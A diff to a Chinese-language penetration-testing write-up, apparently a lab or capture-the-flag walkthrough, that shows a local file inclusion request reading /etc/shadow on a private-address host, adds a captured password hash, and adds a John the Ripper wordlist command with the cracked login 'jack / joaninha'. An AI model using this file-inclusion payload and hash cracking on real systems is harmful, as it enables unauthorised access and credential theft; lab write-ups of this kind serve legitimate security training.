@@ -29,13 +29,15 @@ http://192.168.44.147/building
 初次尝试得到结果
 http://192.168.44.147/building/index.php?page=/etc/shadow
 
-
+jack:$6$xyz$FU1GrBztUeX8krU/94RECrFbyaXNqU8VMUh3YThGCAGhlPqYCQryXBln3q2J2vggsYcTrvuDPTGsPJEpn/7U.0:19236:0:99999:7::: 
 jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:19240:0:99999:7::: 
 ```
 # john爆破
 
-爆破n万年
+爆破
 ```c
+kali㉿kali)-[~/桌面/OSCP]
+└─$ john -w=../rockyou.txt hash_jabita
 账号：jack
 密码：joaninha
 ```
